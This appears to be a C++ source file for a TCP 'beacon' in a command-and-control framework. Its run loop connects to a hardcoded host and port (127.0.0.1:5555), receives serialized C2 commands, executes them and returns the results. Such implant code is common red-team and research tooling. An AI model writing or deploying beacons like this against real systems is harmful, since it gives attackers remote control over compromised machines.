#include "BeaconTcp.hpp"


using namespace std;
using boost::asio::ip::tcp;


BeaconTcp::BeaconTcp()
	: Beacon()
{
}


BeaconTcp::~BeaconTcp()
{
}


int BeaconTcp::runTcp()
{
	int remotePort=5555;
	string remoteHost="127.0.0.1";

	Client* client_=new Client(remoteHost, remotePort);
	m_clientsTcp.push_back(client_);

	bool exit=false;
	while(!exit)
	{
		string cmd;
		bool res = m_clientsTcp[0]->receive(cmd);
		if(!res)
		{
			return -1;
		}

		C2Message c2Message;
		c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
		C2Message c2RetMessage;

		exit = execInstruction(c2Message, c2RetMessage);

		string out;
		c2RetMessage.SerializeToString(&out);
		m_clientsTcp[0]->send(out);
	}

	return 0;
}


